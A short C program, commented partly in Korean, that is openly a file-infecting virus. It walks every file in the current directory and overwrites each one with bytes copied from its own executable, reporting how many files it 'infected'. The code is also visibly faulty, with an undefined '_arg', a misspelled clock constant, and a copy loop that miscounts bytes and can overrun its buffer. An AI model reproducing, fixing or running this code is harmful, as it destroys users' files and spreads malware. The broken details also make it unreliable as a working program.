#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <windows.h>

#include <dir.h>
#include <io.h>



FILE* Class, * vClass;
int owned = 0, a = 0;
unsigned long x;
char buff[256];
struct ffblk ff;
clock_t st, end;

void clrscr() {

	COORD Cur = { 0,0 };
	unsigned long dwLen;
	FillConsoleOutputCharacter(GetStdHandle(STD_OUTPUT_HANDLE), ' ', 80 * 25, Cur, &dwLen);
}

int main() {
	
	st = clock(); // 프로그램 시작 시간 체크
	clrscr();   // 콘솔의 내용을 지워주는 함수 호출
	owned = (findfirst("*.*", &ff, 0));
	printf("infecting %s\n", ff.ff_name);

	while (!owned) {
		Class = fopen(_arg[0], "rb");
		vClass = fopen(ff.ff_name, "rb+");
		if (vClass == NULL) goto next;

		x = 89088;
		printf("infecting %s\n", ff.ff_name);

		while (x > 2048) {

			fread(buff, 256, 1, Class);
			fwrite(buff, 256, 1, vClass);
			x -= 2048;
		}



		fread(buff, x, 1, Class);
		fwrite(buff, x, 1, vClass);
		a++;

	next: fcloseall();

		owned = findnext(&ff);

	}

	end = clock(); // 프로그램 종료 시간 체크
	printf("Infected %d files in %f sec", a, (end - st) / CLOCKS_PER_SEC);
	printf("Infected %d files in %f sec", a, (end - st) / CLK_TCk);
	return (0);

}